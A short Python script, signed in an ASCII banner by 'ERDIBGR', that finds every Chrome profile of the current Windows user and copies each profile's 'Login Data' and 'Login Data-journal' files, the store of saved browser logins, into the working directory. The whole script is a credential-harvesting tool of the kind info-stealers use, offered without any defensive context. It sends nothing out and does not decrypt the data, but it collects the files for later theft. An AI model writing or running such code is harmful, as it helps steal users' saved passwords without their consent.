"""
'########::'####:'########:'########::'#######::
 ##.... ##:. ##::..... ##::..... ##::'##.... ##:
 ##:::: ##:: ##:::::: ##::::::: ##::: ##:::: ##:
 ##:::: ##:: ##   CREATED BY ERDIBGR  ##:::: ##:
 ##:::: ##:: ##:::: ##::::::: ##::::: ##:::: ##:
 ##:::: ##:: ##::: ##::::::: ##:::::: ##:::: ##:
 ########::'####: ########: ########:. #######::
........:::....::........::........:::.......:::

"""
import os
import getpass
from shutil import copyfile
dnames = []
username = getpass.getuser()
source = 'C:\\Users\\'+username+'\\AppData\\Local\\Google\\Chrome\\User Data\\'
#Note: Type slash marks twice!!!
target = os.getcwd()
if(os.path.exists(source+"Default")):
    dnames.append("Default")
for x in os.listdir(source):
    if(x[:7] == "Profile"):
        dnames.append(x)
for gir in dnames:
    if(os.path.exists(target + '\\' + gir) == False):   
        os.mkdir(gir)
    copyfile(source + '\\' + gir + '\\Login Data', target + '\\' + gir + '\\Login Data')
    copyfile(source + '\\' + gir + '\\Login Data-journal', target + '\\' + gir + '\\Login Data-journal')
